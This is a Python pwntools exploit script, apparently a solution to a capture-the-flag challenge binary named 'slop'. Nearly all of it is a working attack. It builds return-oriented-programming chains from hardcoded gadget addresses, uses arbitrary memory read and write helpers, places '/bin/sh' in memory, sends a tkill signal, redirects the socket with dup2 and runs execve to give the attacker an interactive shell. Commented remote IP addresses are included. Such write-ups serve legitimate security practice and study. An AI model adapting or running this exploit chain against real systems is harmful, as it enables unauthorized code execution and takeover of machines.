from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './slop'
HOST = '0'
PORT =  1024
#HOST = '116.203.112.158'
#HOST = '10.244.0.1'

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM pass\n"#"handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

serv = start()
if args.D:
    debug(serv, [0x1caf])

r = remote(HOST, PORT)

if False:
    r.recvuntilb(b'"')
    hash_head = r.recvuntilb(b'"', True)
    r.recvuntilb(b'with ')
    bits = r.recvuntilb(b' ', True)
    import subprocess

    cmd = ["./pow-solver", bits.decode(), hash_head.decode()]
    print(cmd)
    result = subprocess.run(
        cmd,      # 実行するバイナリ
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True              # 文字列として受け取る（Python 3.7+）
    )

    r.sendlineafter(b').\n', result.stdout)


rax = 0x00483876
rdx_p1 = 0x0048536c
rdi = 0x0048dfc4
rsi = 0x0048b8fbf
rsi_p2 = 0x00489c61
syscall = 0x0047b5a7
xchg_edi_eax = 0x0047a75a
mov_rdi_rdx = 0x004835b0#: mov [rdi], rdx; ret;
rbp = 0x40489b
leave = 0x401cae
deref_rax = 0x00488fe8#: mov rax, [rax]; ret;
store_rax = 0x004812e0#: mov [rdx], rax; pop rbx; ret;
sub_rax = 0x00479c01#: sub rax, rdi; ret;


def aaw(where, what):
    return flat(rdi, where, rdx_p1, what, 0xbeef, mov_rdi_rdx)
def aar(where, store, sub=0, deref=False):
    if sub == 0:
        if deref == False:
            return flat(rax, where, deref_rax, rdx_p1, store, 0xbeef, store_rax, 0xbeef)
        else:
            return flat(rax, where, deref_rax,deref_rax, rdx_p1, store, 0xbeef, store_rax, 0xbeef)
    else:
        if deref == False:
            return flat(rax, where, deref_rax, rdi, sub, sub_rax, rdx_p1, store, 0xbeef, store_rax, 0xbeef)
        else:
            return flat(rax, where, deref_rax, deref_rax, rdi, sub, sub_rax, rdx_p1, store, 0xbeef, store_rax, 0xbeef)


payload = b''
payload += flat(0xbeef)

payload += aar(0x4c5948, 0x4c1000, sub=0x1d8) # stack addr
payload += aar(0x4c1000, 0x4c1100, sub=0xd38,deref=True) # stack addr of main

payload += aaw(0x4c6170, 0x4c1100-0x10)
payload += aaw(0x4c1100-0x10, 0)
payload += aaw(0x4c1100-0x08, 4)
payload += aaw(0x4c1100+8, 0x400)
payload += aaw(0x4c1120, u64(b'/bin/sh\x00'))
payload += aaw(0x4c1140, 0x4c1120)
payload += aaw(0x4c1148, 0)

payload += flat(rax, 0x27, syscall, xchg_edi_eax) # getpid()
payload += flat(rax, 0xc8, rsi_p2, 33, 0, 0, syscall) # tkill(pid, SIGSETXID)
payload += flat(rax, 0x22, syscall) # pause
payload = payload.ljust(0x300, b'a')
r.sendafter(b'\n', payload)

# dup2 --> syscall ( no need to do CLOSEXEC )
payload = b''
payload += p64(rdi+1)*50
payload += flat(rax, 0x21, rdi, 4, rsi_p2, 0, 0x11, 0x22, syscall)
payload += flat(rax, 0x21, rdi, 4, rsi_p2, 1, 0x11, 0x22, syscall)
payload += flat(rax, 0x21, rdi, 4, rsi_p2, 2, 0x11, 0x22, syscall)
payload += flat(rax, 0x3b, rdi, 0x4c1120, rsi_p2, 0, 0x11, 0x22, rdx_p1, 0, 0x33, syscall, 0xbeeef)
r.send(payload)

r.interactive()
r.close()

